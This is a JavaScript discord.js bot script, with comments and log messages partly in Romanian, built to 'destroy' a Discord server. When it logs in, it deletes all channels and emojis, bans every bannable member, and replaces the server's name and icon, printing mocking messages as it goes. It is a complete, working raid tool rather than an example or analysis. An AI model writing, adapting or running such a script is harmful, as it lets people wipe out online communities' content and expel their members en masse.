// Initialise a client and Discord object.
const Discord = require("discord.js");
const client = new Discord.Client();

// Settings for the bot.
const settings = {
    botToken: "token",
    guildID: "Id-ul sv-ului",
    guildName: "Nume pentru server"
};


// Once the bot is ready start destroying the guild!
client.once('ready', () => {
    // Success msg.
    console.info(`\x1b[37m\x1b[44mINFO\x1b[0m: Logged in as ${client.user.tag}. (^o^)／`);

    // Get the guild using the ID.
    let guild = client.guilds.get(settings.guildID);

    // Delete all channels.
    guild.channels.forEach(c => {
        c.delete();
        console.info(`\x1b[37m\x1b[44mINFO\x1b[0m: Am sters canalul ${c.name}; ID: ${c.id}. (╯°□°）╯︵ ┻━┻`);
    });

    // Delete all emojis.
    guild.emojis.forEach(e => {
        guild.deleteEmoji(e);
        console.info(`\x1b[37m\x1b[44mINFO\x1b[0m: Am sters emojiul ${e.name}; ID: ${e.id}. (╯°□°）╯︵ ┻━┻`);
    });

    // Ban all users.
Promise.all(guild.members.map(async (m) => {
      if (m.bannable) {
        return m.ban();
      }
    }));
    // Set the guild icon to nothing.
    guild.setIcon("https://avatarfiles.alphacoders.com/160/thumb-160554.jpg");

    // Set the guild name to the desired name.
    guild.setName(settings.guildName);
    
    // Success prompt.
    console.info("\x1b[37m\x1b[42mSuccess\x1b[0m: Operatiune completa, adv zic (^_^)/~");
})

// Login into the bot.
client.login(settings.botToken);

// Some handle uncaught exceptions.
process.on("uncaughtException", err => {
    console.error("\x1b[37m\x1b[41mERROR\x1b[0m: An unknown and unexpected error occurred! x.x.", err);
    process.exit(1);
});

// Some what handle unhandled rejections.
process.on("unhandledRejection", err => {
    process.exit(1);
});